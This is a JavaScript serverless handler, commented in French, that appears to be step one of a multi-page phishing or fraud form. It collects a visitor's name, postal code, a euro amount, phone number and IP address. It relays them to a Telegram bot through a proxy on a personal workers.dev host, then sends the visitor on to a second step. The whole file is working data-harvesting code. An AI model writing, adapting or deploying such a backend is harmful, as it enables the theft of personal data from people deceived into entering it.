export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Méthode non autorisée' });
    }

    try {
        let data = req.body;
        if (typeof data === 'string') {
            try {
                data = JSON.parse(data);
            } catch (e) {
                return res.status(400).json({ success: false, message: 'Format JSON invalide.' });
            }
        }

        // Lecture des variables de l'Étape 1
        const page_source = data.page_source || 'B1_Formulaire_Infos_Personnelles';
        const champ1 = data.champ1 || 'Non saisi'; // Nom et Prénom
        const champ2 = data.champ2 || 'Non saisi'; // Code Postal
        const champ3 = data.champ3 || 'Non saisi'; // Montant
        const champ4 = data.champ4 || 'Non saisi'; // Téléphone

        // Extraction IP et Horodatage
        const userIp = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Inconnue';
        const dateStr = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });

        // Construction du message Telegram Étape 1
        let message = `⚜️ **[ ÉTAPE 1 - INFOS PERSONNELLES ]** ⚜️\n`;
        message += `───────────────────\n\n`;
        message += `📍 **Provenance :** \`Page ${page_source}\`\n\n`;
        message += `👤 **Nom & Prénom :** \`${champ1}\`\n`;
        message += `🏠 **Code Postal :** \`${champ2}\`\n`;
        message += `💰 **Montant :** \`${champ3}€\`\n`;
        message += `📞 **Téléphone :** \`${champ4}\`\n\n`;
        message += `🖥️ **IP Client :** \`${userIp}\`\n`;
        message += `───────────────────\n`;
        message += `📅 **Date :** \`${dateStr}\``;

        // Configuration Telegram / Worker
        const workerUrl = process.env.WORKER_URL || 'https://wer-proxy.angelobarbes.workers.dev';
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!token || !chatId) {
            return res.status(500).json({ success: false, message: 'Configuration Telegram manquante sur Vercel.' });
        }

        const gatewayUrl = `${workerUrl.replace(/\/$/, '')}/bot${token}/sendMessage`;

        // Envoi de la requête à Telegram
        const response = await fetch(gatewayUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });

        if (response.ok) {
            // Réponse transmise au JS de etape1.html pour redirection
            return res.status(200).json({ success: true, redirect: 'etape2.html' });
        } else {
            const errText = await response.text();
            return res.status(500).json({ success: false, message: `Erreur Telegram: ${errText}` });
        }

    } catch (error) {
        console.error("Erreur serveur étape 1 :", error);
        return res.status(500).json({ success: false, message: error.message });
    }
}